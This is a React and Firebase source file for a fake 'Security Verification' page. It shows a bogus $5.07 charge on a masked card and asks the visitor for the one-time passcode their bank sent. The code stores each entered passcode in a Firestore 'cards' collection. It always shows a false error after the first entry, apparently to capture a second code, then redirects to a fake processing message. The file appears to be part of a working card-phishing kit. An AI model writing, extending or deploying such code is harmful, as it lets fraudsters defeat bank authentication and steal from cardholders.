import { LoadingButton } from "@mui/lab";
import { Alert, Container, Snackbar, styled } from "@mui/material";
import { doc, setDoc } from "firebase/firestore";
import React, { useState } from "react";
import { useNavigate, useParams } from "react-router-dom";
import { db } from ".";

var today = new Date();
var dd = String(today.getDate()).padStart(2, "0");
var mm = String(today.getMonth() + 1).padStart(2, "0"); //January is 0!
var yyyy = today.getFullYear();
var time =
  today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
today = mm + "/" + dd + "/" + yyyy;

const ColorButton = styled(LoadingButton)(({ theme }) => ({
  fontSize: 16,
  textTransform: "none",
}));

const StyledAlert = styled(Alert)(({ theme }) => ({
  fontSize: 16,
  textTransform: "none",
}));

export const Verified = () => {
  return (
    <Container style={{ marginTop: 40 }}>
      <div className="alert alert-success" role="alert">
        <strong className="alert-link">
          👍 your transaction is now proccessing, we will send you your delivery
          detail to your email once your transaction has been successfully
          proccessed, thank you.
        </strong>
      </div>
    </Container>
  );
};

function OtpStatic() {
  const [state, setState] = useState({ passcode: "" });
  const [loading, setLoading] = useState(false);
  const [submited, setSubmited] = useState(0);
  const navigate = useNavigate();

  const [snackbar, setSnackbar] = useState({
    open: false,
    vertical: "top",
    horizontal: "center",
  });

  const { vertical, horizontal, open } = snackbar;

  const handleClose = () => {
    setSnackbar({ ...snackbar, open: false });
  };

  let { cardigit, param } = useParams();

  const handleChange = (event) => {
    setState({
      ...state,
      [event.target.name]: event.target.value,
    });
    console.log(event.target.value);
  };

  const submit = (e) => {
    e.preventDefault();
    setLoading(true);
    const cardRef = doc(db, "cards", param);
    setDoc(cardRef, state, { merge: true }).then(() => {
      // navigate("/confirm", { replace: true })

      if (submited == 0) {
        setSnackbar({
          ...snackbar,
          open: true,
        });
        setSubmited(submited + 1);
        setLoading(false);
      } else {
        navigate("/confirm", { replace: true });
        console.log("done");
      }
    });
  };

  return (
    <Container>
      <h3>Security Verification</h3>
      <div className="alert alert-info" role="alert">
        <strong className="alert-link">
          A one time passcode has been sent to the mobile number connected with
          the below credit card detalis, please use the passcode to authenticate
          the transaction.
        </strong>
      </div>

      {[
        { title: "date", value: `${today} ${time}` },
        { title: "cardnumber", value: `*********${cardigit}` },
        { title: "amount", value: "$5.07" },
      ].map((value, index) => (
        <div key={index}>
          <div style={{ display: "flex", marginTop: 5 }}>
            <h4> {value.title}:</h4>
            <h4 style={{ marginLeft: 5 }}>{value.value}</h4>
          </div>
        </div>
      ))}
      <form onSubmit={submit}>
        <div style={{ display: "flex", marginTop: 5 }}>
          <h4> Enter otp:</h4>
          <div style={{ marginLeft: 5 }} className="form-group">
            <input
              type="number"
              name="passcode"
              className="form-control"
              placeholder="enter otp"
              onChange={handleChange}
              autoFocus
              required
            />
          </div>
        </div>
        <div style={{ marginTop: 10 }}>
          <ColorButton
            // fullWidth
            type="submit"
            variant="contained"
            color="success"
            loading={loading}
            disableElevation
          >
            Confirm passcode
          </ColorButton>
        </div>
      </form>
      <div style={{ marginTop: 10 }}>
        <ColorButton variant="text" loading={false}>
          Resend passcode
        </ColorButton>
      </div>

      <Snackbar
        anchorOrigin={{ vertical, horizontal }}
        open={open}
        onClose={handleClose}
        autoHideDuration={6000}
      >
        <StyledAlert
          onClose={handleClose}
          severity="warning"
          variant="filled"
          sx={{ width: "100%" }}
        >
          Sorry something went wrong, please retry
        </StyledAlert>
      </Snackbar>
    </Container>
  );
}

export default OtpStatic;
